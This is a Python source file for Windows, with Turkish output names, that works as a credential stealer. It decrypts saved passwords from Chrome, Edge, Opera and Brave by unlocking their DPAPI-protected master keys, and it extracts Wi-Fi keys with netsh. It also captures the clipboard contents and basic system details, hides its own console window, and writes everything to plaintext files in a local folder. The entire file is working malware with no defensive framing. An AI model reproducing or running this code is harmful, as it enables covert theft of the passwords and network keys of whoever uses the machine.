import os
import shutil
import sqlite3
import json
import base64
import win32crypt
import socket
import sys
import ctypes
import subprocess
import tempfile
from Crypto.Cipher import AES

browsers = {
    "chrome": {
        "local_state": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"),
        "login_data": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    },
    "edge": {
        "local_state": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"),
        "login_data": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
    },
    "opera": {
        "local_state": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Local State"),
        "login_data": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Login Data")
    },
    "brave": {
        "local_state": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State"),
        "login_data": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
    },
}

def get_script_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except:
            return ""

def export_passwords(browser_name, local_state_path, login_data_path, output_file):
    if not os.path.exists(local_state_path) or not os.path.exists(login_data_path):
        return
    key = get_master_key(local_state_path)
    temp_db_path = os.path.join(tempfile.gettempdir(), "Loginvault_temp.db")
    shutil.copy2(login_data_path, temp_db_path)
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        with open(output_file, "w", encoding="utf-8") as f:
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = decrypt_password(encrypted_password, key)
                if username or password:
                    f.write(f"{url} | {username} | {password}\n")
    except:
        pass
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_db_path)

def get_wifi_passwords(output_file):
    try:
        networks = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
        profiles = [line.split(":")[1].strip() for line in networks.split("\n") if "All User Profile" in line]
        with open(output_file, "w", encoding="utf-8") as f:
            for profile in profiles:
                try:
                    result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode("utf-8", errors="ignore")
                    for line in result.split("\n"):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            f.write(f"{profile} | {password}\n")
                            break
                except:
                    pass
    except:
        pass

def get_system_info(output_file):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        mac = ':'.join(['{:02x}'.format((os.getpid() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(f"Bilgisayar Adı: {hostname}\nIP Adresi: {ip}\nMAC Adresi (PID temelli): {mac}\n")
    except:
        pass

def get_clipboard(output_file):
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(data)
    except:
        pass

def main():
    save_dir = os.path.join(get_script_dir(), f"Bilgiler_{socket.gethostname()}")
    os.makedirs(save_dir, exist_ok=True)

    for browser, paths in browsers.items():
        export_passwords(browser, paths["local_state"], paths["login_data"],
                         os.path.join(save_dir, f"{browser}_sifreler.txt"))

    get_wifi_passwords(os.path.join(save_dir, "wifi_sifreleri.txt"))
    get_clipboard(os.path.join(save_dir, "pano.txt"))
    get_system_info(os.path.join(save_dir, "sistem_bilgisi.txt"))

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
